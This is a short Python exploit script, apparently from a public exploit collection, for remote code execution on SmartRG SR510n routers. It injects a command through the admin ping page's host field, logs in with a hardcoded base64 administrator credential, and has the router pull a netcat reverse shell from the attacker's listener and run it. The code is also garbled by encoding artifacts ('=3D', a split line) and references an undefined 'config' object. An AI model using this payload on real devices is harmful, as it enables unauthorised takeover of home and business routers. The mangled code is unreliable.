# Exploit Title: SmartRG Router SR510n 2.6.13 - RCE (Remote Code Execution)
# done by Sathwik.R - www.github.com/cicada0007

import requests
from subprocess import Popen, PIPE

router_host =3D "http://192.168.1.1"
authorization_header =3D "YWRtaW46QWRtMW5ATDFtMyM=3D"

lhost =3D "lo"
lport =3D 80

payload_port =3D 81


def main():
    e_proc =3D Popen(["echo", f"rm /tmp/s & mknod /tmp/s p & /bin/sh 0< /tm=
p/s | nc {lhost} {lport} > /tmp/s"], stdout=3DPIPE)
    Popen(["nc", "-nlvp", f"{payload_port}"], stdin=3De_proc.stdout)
    send_payload(f"|nc {lhost} {payload_port}|sh")
    print("done.. check shell")


def get_session():
    url =3D router_host + "/admin/ping.html"
    headers =3D {"Authorization": "Basic {}".format(authorization_header)}
    r =3D requests.get(url, headers=3Dheaders).text
    i =3D r.find("&sessionKey=3D") + len("&sessionKey=3D")
    s =3D ""
    while r[i] !=3D "'":
        s =3D s + r[i]
        i =3D i + 1
    return s


def send_payload(payload):
    session_key = get_session()
    url = f"{config['router_host']}/admin/pingHost.cmd"
    headers = {"Authorization": config['authorization_header']}
    params = {"action": "add", "targetHostAddress": payload, "sessionKey": session_key}
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        print("Payload successfully sent.")
    else:
        print("Failed to send payload.")



main()
